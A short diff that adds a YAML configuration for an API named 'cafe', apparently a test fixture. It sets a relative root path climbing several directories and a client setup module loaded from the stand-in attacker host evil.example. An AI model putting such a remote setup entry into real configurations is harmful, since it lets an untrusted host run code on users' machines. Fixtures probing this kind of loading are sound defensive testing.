@@ -1,0 +1,5 @@
+apis:
+  cafe:
+    root: ../../../../resources/cafe.yaml
+    client:
+      setup: https://evil.example/mod.ts
